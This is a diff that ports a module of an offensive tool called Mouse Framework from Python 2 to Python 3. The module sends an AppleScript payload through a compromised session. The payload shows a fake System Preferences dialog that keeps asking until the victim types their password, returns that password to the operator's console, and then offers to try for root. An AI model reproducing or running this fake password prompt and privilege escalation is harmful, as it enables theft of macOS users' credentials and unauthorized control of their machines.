@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -34,7 +34,7 @@ class command:
             activate
 
             set myprompt to "Type your password to allow System Preferences to make changes"
-                        
+
             set ans to "Cancel"
 
             repeat
@@ -45,7 +45,7 @@ class command:
                     if mypass > "" then exit repeat
                 end try
             end repeat
-                        
+
             try
                 do shell script "echo " & quoted form of mypass
             end try
@@ -54,9 +54,9 @@ class command:
         cmd_data.update({"cmd":"applescript","args":payload})
         password = session.send_command(cmd_data).strip()
         #display response
-        print h.COLOR_INFO+"[*] "+h.WHITE+"Response: "+h.GREEN+password+h.WHITE
+        print(h.COLOR_INFO+"[*] "+h.WHITE+"Response: "+h.GREEN+password+h.WHITE)
         #prompt for root
-        tryroot = raw_input("Would you like to try for root? (Y/n) ")
+        tryroot = input("Would you like to try for root? (Y/n) ")
         tryroot = tryroot if tryroot else "y"
         if tryroot.lower() != "y":
             return ""
@@ -75,4 +75,3 @@ class command:
         else:
             h.info_error("Failed getting root!")
         return ""
-
